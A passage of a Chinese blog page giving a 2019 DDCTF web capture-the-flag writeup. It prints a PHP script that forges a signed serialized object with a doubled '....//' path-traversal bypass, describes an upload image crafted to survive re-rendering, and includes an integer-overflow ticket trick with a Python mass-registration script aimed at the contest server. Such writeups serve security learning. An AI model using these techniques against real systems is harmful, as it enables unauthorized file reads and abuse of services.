&#125;</span><br></pre></td></tr></table></figure></p>
+<p>发现这个path值 过滤了<code>../</code>可以进行双写绕过</p>
+<p>于是构造Application类<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">class Application&#123;</span><br><span class="line">	var $session_id = &apos;5c5d2e08abcb1f7f32228b19935a9fb5&apos;;</span><br><span class="line">	var $ip_address = &apos;117.158.83.66&apos;;</span><br><span class="line">	var $user_agent = &apos;Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:66.0)+Gecko/20100101+Firefox/66.0&apos;;</span><br><span class="line">	var $user_data = &apos;&apos;;</span><br><span class="line">	var $path = &apos;....//config/flag.txt&apos;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new Application();</span><br><span class="line">$a = serialize($a);</span><br><span class="line">echo urlencode($a.md5(&apos;EzblrbNS&apos;.$a));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p><a href="https://imgchr.com/i/EpzXMF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/19/EpzXMF.md.png" alt="EpzXMF.md.png"></a></p>
+<p>得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDCTF&#123;ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h3><p>打开页面发现是一个文件上传的题目</p>
+<p>先随便传一个图片看一下</p>
+<p><a href="https://imgchr.com/i/Aj7sUA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/15/Aj7sUA.md.png" alt="Aj7sUA.md.png"></a></p>
+<p>发现这个是需要经过二次渲染之后 还能找到 phpinfo() 这一串字符串</p>
+<p>让我想到了 以前做过的 upload-labs的第十六关 二次渲染绕过 参考了当时讲课的时候的<a href="https://yang1k.github.io/2018/08/30/upload-pass16/#%E5%87%86%E5%A4%87" target="_blank" rel="noopener">学长的博客</a></p>
+<p>于是开始制作一个 能过绕过二次渲染的图片</p>
+<p>首先保存一个 已经被渲染的图片 命名为 1.jpg</p>
+<p>然后用脚本开始跑图片<br>其中关键字改为<code>phpinfo()</code>就可以了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php phpinfo.php 1.jpg</span><br></pre></td></tr></table></figure></p>
+<p>制作完成一张  合格的图片</p>
+<p>然后上传 就会得到flag：</p>
+<p><a href="https://imgchr.com/i/E9p2ng" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/19/E9p2ng.md.png" alt="E9p2ng.md.png"></a></p>
+<h3 id="大吉大利，今晚吃鸡"><a href="#大吉大利，今晚吃鸡" class="headerlink" title="大吉大利，今晚吃鸡"></a>大吉大利，今晚吃鸡</h3><p>打开页面是一个 类似吃鸡模式的游戏</p>
+<p>首先获得入场券，然后淘汰其他选手就能获得flag</p>
+<p>首先购买入场券 通过抓包发现<code>ticket_price=2000</code>这个参数可以进行修改，但是只能改大不能改小，于是想到了php的整形溢出 令<code>ticket_price=4294967296</code> 就可以买到入场券 进入游戏</p>
+<p><a href="https://imgchr.com/i/E998Ej" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/19/E998Ej.md.png" alt="E998Ej.md.png"></a></p>
+<p>然后想到了利用python写脚本注册大量的用户 然后再把它们移除</p>
+<p>脚本为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&quot;utf8&quot;)</span><br><span class="line"></span><br><span class="line">id = open(&quot;1.txt&quot;, &quot;a&quot;)</span><br><span class="line">ticket = open(&quot;2.txt&quot;,&quot;a&quot;) </span><br><span class="line"></span><br><span class="line">for i in range(150):</span><br><span class="line">	register_url = &quot;http://117.51.147.155:5050/ctf/api/register&quot;</span><br><span class="line">	r = requests.session()</span><br><span class="line">	register_playload = &quot;?name=chuddy1234chuddy123chuddy123chuddy123chuddy123&quot;+str(i)+&quot;&amp;password=123456789a&quot;</span><br><span class="line">	# print register_playload</span><br><span class="line">	s = r.get(url=register_url+register_playload)</span><br><span class="line">	# print s.text</span><br><span class="line">	tick_url = &quot;http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296&quot;</span><br><span class="line">	tick = r.get(url=tick_url)</span><br><span class="line">	a = tick.text</span><br><span class="line">	bill_id = re.search(r&apos;id&quot;:&quot;(.*)&quot;,&quot;tick&apos;,a).group(1)</span><br><span class="line">	# print bill_id</span><br><span class="line">	pay_url = &quot;http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=&quot;+bill_id</span><br><span class="line">	pay = r.get(url=pay_url)</span><br><span class="line">	success = &apos;&#123;&quot;code&quot;:200,&quot;data&quot;:[&#123;&quot;your_id&quot;:75,&quot;your_ticket&quot;:&quot;4c529f4afa586f5d8e1e8bd89a6f28dd&quot;&#125;],&quot;msg&quot;:&quot;\u4ea4\u6613\u6210\u529f&quot;&#125;&apos;</span><br><span class="line">	pay_id1 = re.search(r&apos;your_id&quot;:(.*),&quot;you&apos;,pay.text).group(1)</span><br><span class="line">	pay_ticket1 = re.search(r&apos;your_ticket&quot;:&quot;(.*)&quot;&#125;],&quot;msg&quot;&apos;,pay.text).group(1)</span><br><span class="line">	print pay_id1</span><br><span class="line">	print pay_ticket1</span><br><span class="line">	id.write(pay_id1)</span><br><span class="line">	id.write(&quot;\n&quot;)</span><br><span class="line">	ticket.write(pay_ticket1)</span><br><span class="line">	ticket.write(&quot;\n&quot;)</span><br></pre></td></tr></table></figure></p>
+<p>这个可以获得大量的注册的用户，再用bp跑一下 将他们清除掉就可以获得flag了</p>
+<p><a href="https://imgchr.com/i/E9COYR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/19/E9COYR.md.png" alt="E9COYR.md.png"></a></p>
+<p>跑完脚本就能得到flag了</p>
+<p><a href="https://imgchr.com/i/E9FQWn" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/19/E9FQWn.md.png" alt="E9FQWn.md.png"></a></p>
+<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDCTF&#123;chiken_dinner_hyMCX[n47Fx)&#125;</span><br></pre></td></tr></table></figure></p>
+
+            <div class="post-copyright">
+    <div class="content">
+        <p>最后更新： 2019年04月22日 16:25</p>
+        <p>原始链接： <a class="post-url" href="/2019/04/22/didictf-writeup/" title="didictf writeup">http://yoursite.com/2019/04/22/didictf-writeup/</a></p>
+        <footer>
+            <a href="http://yoursite.com">
+                <img src="/images/logo.png" alt="chuddy">
+                chuddy
+            </a>
+        </footer>
+    </div>
+</div>
+
+      
+        
+            
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;">赏</a>
+</div>
+
+<div id="reward" class="post-modal reward-lay">
+    <a class="close" href="javascript:;" id="reward-close">×</a>
+    <span class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        请我吃糖~
+        <i class="icon icon-quote-right"></i>
+    </span>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/images/wechat_code.jpg" alt="打赏二维码">
+        </div>
+        <div class="reward-select">
+            
+            <label class="reward-select-item checked" data-id="wechat" data-wechat="/images/wechat_code.jpg">
+                <img class="reward-select-item-wechat" src="/images/wechat.png" alt="微信">
+            </label>
+            
+            
+            <label class="reward-select-item" data-id="alipay" data-alipay="/images/alipay_code.jpg">
+                <img class="reward-select-item-alipay" src="/images/alipay.png" alt="支付宝">
+            </label>
+            
+        </div>
+    </div>
+</div>
+
+
+        
+    </div>
+    <footer class="article-footer">
+        
+        
+<div class="post-share">
+    <a href="javascript:;" id="share-sub" class="post-share-fab">
+        <i class="fa fa-share-alt"></i>
+    </a>
+    <div class="post-share-list" id="share-list">
+        <ul class="share-icons">
+          <li>
+            <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2019/04/22/didictf-writeup/&title=《didictf writeup》 — chuddy's Blog&pic=http://yoursite.comimages/logo.png" data-title="微博">
+              <i class="fa fa-weibo"></i>
+            </a>
+          </li>
+          <li>
+            <a class="weixin share-sns" id="wxFab" href="javascript:;" data-title="微信">
+              <i class="fa fa-weixin"></i>
+            </a>
+          </li>
+          <li>
+            <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2019/04/22/didictf-writeup/&title=《didictf writeup》 — chuddy's Blog&source=" data-title="QQ">
+              <i class="fa fa-qq"></i>
+            </a>
+          </li>
+          <li>
+            <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/04/22/didictf-writeup/" data-title="Facebook">
+              <i class="fa fa-facebook"></i>
+            </a>
+          </li>
+          <li>
+            <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《didictf writeup》 — chuddy's Blog&url=http://yoursite.com/2019/04/22/didictf-writeup/&via=http://yoursite.com" data-title="Twitter">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+          <li>
+            <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2019/04/22/didictf-writeup/" data-title="Google+">
+              <i class="fa fa-google-plus"></i>
+            </a>
+          </li>
+        </ul>
+     </div>
+</div>
+<div class="post-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;" id="wxShare-close">×</a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=http://yoursite.com/2019/04/22/didictf-writeup/" alt="微信分享二维码">
+</div>
+
+<div class="mask"></div>
+
+        
+        <ul class="article-footer-menu">
+            
+            
+  <li class="article-footer-tags">
+    <i class="fa fa-tags"></i>
+      
+    <a href="/tags/writeup/" class="color3">writeup</a>
+      
+  </li>
+
+        </ul>
+        
+    </footer>
+  </div>
+</article>
+
+
+    <aside class="post-toc-pos post-toc-top" id="post-toc">
+        <nav class="post-toc-wrap">
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#2019DDCTF-writeup"><span class="post-toc-text">2019DDCTF writeup</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#web"><span class="post-toc-text">web</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#滴"><span class="post-toc-text">滴~</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#web签到题"><span class="post-toc-text">web签到题</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Upload-IMG"><span class="post-toc-text">Upload-IMG</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#大吉大利，今晚吃鸡"><span class="post-toc-text">大吉大利，今晚吃鸡</span></a></li></ol></li></ol></li></ol>
+        </nav>
+    </aside>
+    
+
+<nav id="article-nav">
+  
+  
+    <a href="/2019/04/10/掘安杯writeup/" id="article-nav-older" class="article-nav-link-wrap">
+      <span class="article-nav-title">2019掘安杯writeup</span>
+      <i class="fa fa-hand-o-right" aria-hidden="true"></i>
+    </a>
+  
+</nav>
+
+
+
+    
+</section>
+        
+      </div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+<p>
+    <span id="busuanzi_container_site_uv" style="display:none">
+        总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style="display:none">
+        总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+      <p>
+        Powered by  <a href="http://hexo.io/" target="_blank">Hexo</a>
+        Theme <a href="//github.com/wongminho/hexo-theme-miho" target="_blank">MiHo</a>
+      &copy; 2019 chuddy<br>
+      </p>
+    </div>
+  </div>
+</footer>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+<script>
+  var mihoConfig = {
+      root: "http://yoursite.com",
+      animate: true,
+      isHome: false,
+      share: true,
+      reward: 1
+  }
+</script>
+<div class="sidebar">
+    <div id="sidebar-search" title="Search">
+        <i class="fa fa-search"></i>
+    </div>
+    <div id="sidebar-category" title="Categories">
+        <i class="fa fa-book"></i>
+    </div>
+    <div id="sidebar-tag" title="Tags">
+        <i class="fa fa-tags"></i>
+    </div>
+    <div id="sidebar-top">
+        <span class="sidebar-top-icon"><i class="fa fa-angle-up"></i></span>
+    </div>
+</div>
+<div class="sidebar-menu-box" id="sidebar-menu-box">
+    <div class="sidebar-menu-box-container">
+        <div id="sidebar-menu-box-categories">
+            <a class="category-link" href="/categories/web/">web</a><a class="category-link" href="/categories/writeup/">writeup</a>
+        </div>
+        <div id="sidebar-menu-box-tags">
+            <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a>
+        </div>
+    </div>
+    <a href="javascript:;" class="sidebar-menu-box-close">&times;</a>
+</div>
+<div class="mobile-header-menu-nav" id="mobile-header-menu-nav">
+    <div class="mobile-header-menu-container">
+        <span class="title">Menus</span>
+        <ul class="mobile-header-menu-navbar">
+            
+            <li>
+                <a href="/">
+                    <i class="fa fa-home"></i><span>Home</span>
+                </a>
+            </li>
+            
+            <li>
+                <a href="/archives">
+                    <i class="fa fa-archive"></i><span>Archives</span>
+                </a>
+            </li>
+            
+            <li>
+                <a href="/about">
+                    <i class="fa fa-user"></i><span>About</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    <div class="mobile-header-tag-container">
+        <span class="title">Tags</span>
+        <div id="mobile-header-container-tags">
+            <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a>
+        </div>
+    </div>
+</div>
+<div class="search-wrap">
+    <span class="search-close">&times;</span>
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+            <i class="icon icon-lg icon-chevron-left"></i>
+        </a>
+        <input class="search-field" placeholder="Search..." id="keywords">
+        <a id="search-submit" href="javascript:;">
+            <i class="fa fa-search"></i>
+        </a>
+    <div class="search-container" id="search-container">
+        <ul class="search-result" id="search-result">
+        </ul>
+    </div>
+</div>
+
+<div id="search-tpl">
+    <li class="search-result-item">
+        <a href="{url}" class="search-item-li">
+            <span class="search-item-li-title" title="{title}">{title}</span>
+        </a>
+    </li>
+</div>
+<script src="/js/search.js"></script>
+<script src="/js/main.js"></script>
+
+
+  <script src="//cdn.bootcss.com/particles.js/2.0.0/particles.min.js"></script>
+  <div id="particles"></div>
+  <script src="/js/particles.js"></script>
+
+
+
+
+
+
+
+  <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  <script src="//cdn.bootcss.com/scrollReveal.js/3.0.5/scrollreveal.js"></script>
+  <script src="/js/animate.js"></script>
+
+
+  <script src="/js/pop-img.js"></script>
+  <script>
+     $(".article-entry p img").popImg();
+  </script>
+
+  </div>
+</body>
+</html>
